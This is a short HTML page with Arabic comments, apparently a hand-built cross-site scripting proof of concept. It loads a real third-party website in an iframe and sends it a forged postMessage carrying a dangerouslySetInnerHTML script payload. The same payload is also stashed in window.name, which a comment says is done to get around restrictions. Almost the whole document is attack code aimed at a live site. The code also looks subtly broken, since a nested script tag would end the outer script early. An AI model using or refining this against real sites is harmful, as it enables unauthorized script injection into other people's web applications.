<!DOCTYPE html>
<html>
<head><title>💥 Build XSS manually</title></head>
<body>

<h2>💣 تفجير الثغرة يدويًا</h2>
<iframe id="target" src="https://thebrowser.company" width="100%" height="600"></iframe>

<script>
  const payload = {
    props: {
      dangerouslySetInnerHTML: {
        __html: `<script>alert('🔥 XSS BUILT')</script>`
      }
    }
  };

  window.name = JSON.stringify(payload); // نضع البايلود في name لتجاوز القيود

  const iframe = document.getElementById("target");

  iframe.onload = () => {
    console.log("✅ iframe ready, sending forged message");
    iframe.contentWindow.postMessage(payload, "*");
  };
</script>

</body>
</html>
